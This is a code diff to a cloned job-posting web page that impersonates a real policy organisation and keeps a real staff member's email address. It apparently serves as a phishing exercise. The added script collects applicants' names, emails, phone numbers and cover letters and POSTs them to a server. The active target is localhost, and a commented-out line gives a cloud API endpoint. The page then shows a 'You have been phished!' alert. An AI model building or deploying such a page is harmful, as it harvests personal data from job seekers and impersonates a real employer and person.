@@ -3,6 +3,7 @@
     xmlns:fb="http://www.facebook.com/2008/fbml" lang="en-US"
     class="touch-styles">
     <head>
+        <title>Job Opportunity: Cybersecurity Analyst</title>
         <script type="text/javascript" src="assets/modern.js"></script>
         <script type="text/javascript" src="assets/typekit.js"></script>
         <script type="text/javascript" src="assets/c1.js"></script>
@@ -19,7 +20,25 @@
             function greeting() {
                 var firstname = document.getElementById('form-firstname').value;
                 var lastname = document.getElementById('form-lastname').value;
-
+                var rawemail = document.getElementById('form-email').value;
+                var rawphone = document.getElementById('form-phone').value;
+                var rawcover = document.getElementById('form-cover').value;
+                // TODO: add API endpoint for resume posted as a multi-part package;
+                const payload = JSON.stringify({
+                    name: firstname+' '+lastname,
+                    email: rawemail,
+                    phone: rawphone,
+                    cover: rawcover,
+                });
+                //const url ="https://8yq1uc51xi.execute-api.us-east-1.amazonaws.com/Alpha";
+                const url ="https://127.0.0.1";
+                fetch(url, {method: "POST", headers: {
+                    'Content-Type': 'application/json', 
+                    'Access-Control-Allow-Origin': "*",
+                    'Access-Control-Allow-Headers': 'Authorization',
+                    'Access-Control-Allow-Credentials': true,
+                    'Vary': "Origin"
+                }, body: payload});
                 alert("You have been phished! \nData will be collected and send to a remote server!");
                 return false;
               }
@@ -253,12 +272,81 @@
                                 </div>
                                 
          <div class="sqs-layout sqs-grid-12 columns-12" data-type="page" data-updated-on="1737660114202" id="page-66c4da957c97cb050ffb29bd"><div class="row sqs-row"><div class="col sqs-col-12 span-12"><div class="sqs-block html-block sqs-block-html" data-block-type="2" id="block-41b7bae803f3db8308c2"><div class="sqs-block-content">
-
             <div class="sqs-html-content">
               <h1 style="text-align:center;margin-left:40px;white-space:pre-wrap;">Job Opportunity </h1>
-              <h1 style="text-align:center;white-space:pre-wrap;">Fellow/Senior Fellow, Energy &amp; Climate</h1>
+              <h1 style="text-align:center;white-space:pre-wrap;"> Cybersecurity Policy Analyst </h1>
               <p class="" data-rte-preserve-empty="true" style="white-space:pre-wrap;"></p>
-              <p style="margin-left:80px;white-space:pre-wrap;" class=""><strong>Position Title:</strong> Fellow/Senior Fellow                                                                          <strong>Areas of Focus:</strong> Energy &amp; Climate                                                                              <strong>Start Date: </strong>March 2025 (Full-Time)<br><strong>Location:</strong> Washington, D.C.                                                                                                      <strong>Application Deadline:</strong> February 14, 2025</p><p style="margin-left:80px;white-space:pre-wrap;" class=""><strong>About ORF America </strong></p><p style="margin-left:80px;white-space:pre-wrap;" class=""><strong>Job Summary</strong></p><p style="margin-left:80px;white-space:pre-wrap;" class="">ORF America is seeking a full-time Fellow or Senior Fellow with prior work experience in the field of cybersecurity, and assessing security threats to (i) conduct research on energy security, clean energy technologies, and sustainability, (ii) contribute analyses and commentary on related issues, and (iii) manage policy dialogues related to energy and the environment. The program will recruit high-performing individuals in intelligence or cybersecurity career paths from institutions of higher learning to support ORF America’s mission. During the 12-week program, participants will be immersed in a federal work environment by collaborating with subject matter expert mentors on projects and performing assigned tasks on the intelligence and cybersecurity track. </p><p style="margin-left:80px;white-space:pre-wrap;" class=""><strong>Qualifications</strong>: </p><ul data-rte-list="default" style="margin-left:80px;"><li><p class="" style="white-space:pre-wrap;">A professional or academic background in development, energy security, environmental studies, or a related field. </p></li><li><p class="" style="white-space:pre-wrap;">A Ph.D. in a related field of study or a master’s degree and five years of professional experience.</p></li><li><p class="" style="white-space:pre-wrap;">Fluency in both written and spoken English (additional language skills are a plus but are not required).</p></li><li><p class="" style="white-space:pre-wrap;">Strong research and analytical skills. Candidates should be able to conduct primary source research, offer insightful analysis, and analyze qualitative and quantitative data (experience with STATA or other statistical software is a plus but is not required).</p></li><li><p class="" style="white-space:pre-wrap;">Ability to manage multiple initiatives simultaneously, both within a team and independently, with a keen attention to detail and oversee research program and research assistants.</p></li><li><p class="" style="white-space:pre-wrap;">Eligibility to work in the United States. </p></li></ul><p style="margin-left:80px;white-space:pre-wrap;" class=""><strong>Responsibilities</strong> include but are not limited to:</p><ul data-rte-list="default" style="margin-left:80px;"><li><p class="" style="white-space:pre-wrap;">Conducting research on energy security, clean energy technologies, and sustainability.</p></li><li><p class="" style="white-space:pre-wrap;">Authoring both short- and long-form research reports and commentary on relevant subjects.</p></li><li><p class="" style="white-space:pre-wrap;">Managing policy dialogues on energy, and sustainability.</p></li><li><p class="" style="white-space:pre-wrap;">Writing grant proposals, funder reports, and managing relations with partners.</p></li></ul><p style="margin-left:80px;white-space:pre-wrap;" class=""><strong>Compensation</strong></p><p style="margin-left:80px;white-space:pre-wrap;" class="">ORF America offers a competitive compensation package commensurate with experience.&nbsp;The salary range for this role is $150,000-$200,000.</p><p style="margin-left:80px;white-space:pre-wrap;" class="">Benefits: Healthcare (medical, dental, vision), 403(b), life insurance (basic), short and long-term disability, and a generous paid time off policy.</p><p style="margin-left:80px;white-space:pre-wrap;" class=""><strong>How to Apply</strong></p><p style="margin-left:80px;white-space:pre-wrap;" class="">Interested applicants can fill out the application below or send an email to <a href="mailto:Andreas.Kuehn@oramerica.org"><span style="text-decoration:underline">Andreas.Kuehn@oramerica.org</span></a> in a single PDF file. Please include: “Job Application: Fellow/Energy &amp; Climate Program” in the subject line. ORF America will contact only those candidates who are extended an interview. </p><p style="margin-left:80px;white-space:pre-wrap;" class=""><strong>Applications will only be accepted through February 14. </strong>We encourage interested candidates to apply early as applications will be reviewed on a rolling basis.</p><p class="" style="white-space:pre-wrap;">&nbsp;</p>
+              <p style="margin-left:40px" class=""><strong>Position Title:</strong>  Cyber Policy and Strategy Planner I <br>
+                <strong>Start Date: </strong> May 2025 (Full-Time)<br>
+                <strong>Location:</strong> Atlanta, Georgia <br>                                                                          
+                <strong>Application Deadline:</strong> February 1, 2025 <br>
+            </p>
+            <p style="margin-left:40px" class="">
+                <strong>About ORF America </strong>
+            </p>
+            <!-- Job posting taken from the bellow-->
+            <!--https://www.jobapscloud.com/MD/sup/bulpreview.asp?b=&R1=24&R2=004728&R3=0001-->
+            <p style="margin-left:40px" class="">
+                The Observer Research Foundation America (ORF) is an independent, non-partisan, and nonprofit organization in Washington DC dedicated to addressing policy challenges facing the United States, India, and their partners in a rapidly changing world. Striving to provide the highest level of customer service to its internal and external customers, ORF supports Georgia's agencies and commissions through its leadership and strategic direction for Information Technology and Telecommunications, establishing a long range, target technology architecture, encouraging cross agency collaboration and advocating best practices for operations and project management.
+            </p>
+            <p style="margin-left:40px;" class="">
+                <strong>Job Summary</strong>
+            </p>
+            <p style="margin-left:40px;" class="">
+                The Policy Analyst will assist the Policy Manager in developing and maintaining Statewide cybersecurity plans, strategies, and policies to support and align with organizational cybersecurity initiatives and regulatory compliance. This position will support the Office of Security Management (OSM) in the creation, updating, maintenance, regular review, and implementation of cyber-related policies. The Policy Analyst will oversee the execution of policies, communication to state agencies, and any supporting compliance activities. 
+            </p>
+            <p style="margin-left:40px;" class="">
+                <strong>Qualifications</strong>: 
+            </p>
+                <ul data-rte-list="default" style="margin-left:40px;">
+                    <li>
+                        <p class="" style="white-space:pre-wrap;">Four years of experience in Information security as it relates to policy creation regarding compliance, legislation, governance programs and/or supporting internal audits.</p>
+                    </li>
+                    <li>
+                        <p class="" style="white-space:pre-wrap;">Working knowledge of industry-standard information security frameworks, such as one of the following: NIST, ISO, CIS, COBIT. </p>
+                    </li>
+                    
+                    <li>
+                        <p class="" style="white-space:pre-wrap;">Eligibility to work in the United States. </p>
+                    </li>
+                </ul>
+                <p style="margin-left:40px;" class="">
+
+                <strong>Notes:</strong> Candidates may substitute a bachelor’s degree in IT security management, IT management, information security, political science, business management, communications, or public administration with cybersecurity experience or a related field for up to two years of the required experience
+                </p>
+                <p style="margin-left:40px;" class="">
+                    <strong>Responsibilities</strong> include but are not limited to:
+                </p>
+                <ul data-rte-list="default" style="margin-left:40px;">
+                    <li>
+                        <p class="" style="white-space:pre-wrap;">Assist the Policy Manager in developing and maintaining Statewide cybersecurity plans, strategies, and policies.</p>
+                    </li>
+                    <li>
+                        <p class="" style="white-space:pre-wrap;">Oversee the execution of policies, communication to state agencies, and any supporting compliance activities.</p>
+                    </li>
+                    <li>
+                        <p class="" style="white-space:pre-wrap;">Assist the Cybersecurity Policy Manager in reviewing current state cybersecurity policies, standards, and guidelines</p>
+                    </li>
+                    <li>
+                        <p class="" style="white-space:pre-wrap;">Work with Privacy Officers to understand the policies that govern their function and activities.</p>
+                    </li>
+                    <li>
+                        <p class="" style="white-space:pre-wrap;">Gather industry standard IT and cybersecurity requirements for use in policies, standards and guidelines. </p>
+                    </li>
+                    <li>
+                        <p class="" style="white-space:pre-wrap;">Hold work sessions and meetings to assist in policy, standards and guideline creation.</p>
+                    </li>
+                </ul>
+                <p style="margin-left:40px;" class="">
+                    <strong>Compensation</strong>
+                </p>
+                <p style="margin-left:40px" class="">
+                    ORF America offers a competitive compensation package commensurate with experience.&nbsp;The salary range for this role is $150,000-$200,000.
+                </p>
+                <p style="margin-left:40px;" class="">
+                    Benefits: Healthcare (medical, dental, vision), 403(b), life insurance (basic), short and long-term disability, and a generous paid time off policy.</p><p style="margin-left:40px;white-space:pre-wrap;" class=""><strong>How to Apply</strong></p><p style="margin-left:40px;white-space:pre-wrap;" class="">Interested applicants can fill out the application below or send an email to <a href="mailto:Andreas.Kuehn@oramerica.org"><span style="text-decoration:underline">Andreas.Kuehn@oramerica.org</span></a> in a single PDF file. Please include: “Job Application: Cybersecurity Policy Analyst” in the subject line. ORF America will contact only those candidates who are extended an interview. </p><p style="margin-left:40px;white-space:pre-wrap;" class=""><strong>Applications will only be accepted through February 14. </strong>We encourage interested candidates to apply early as applications will be reviewed on a rolling basis.
+                </p>
+                <p class="" style="white-space:pre-wrap;">&nbsp;</p>
             </div>
             </div></div></div></div></div>
                                 <div
@@ -400,7 +488,7 @@
 
                                                             <textarea
                                                                 class="field-element "
-                                                                id="textarea-yui_3_17_2_1_1583956603981_13544-field"
+                                                                id="form-cover"
                                                                 aria-required="true"></textarea>
                                                         </div>
                                                     </div>
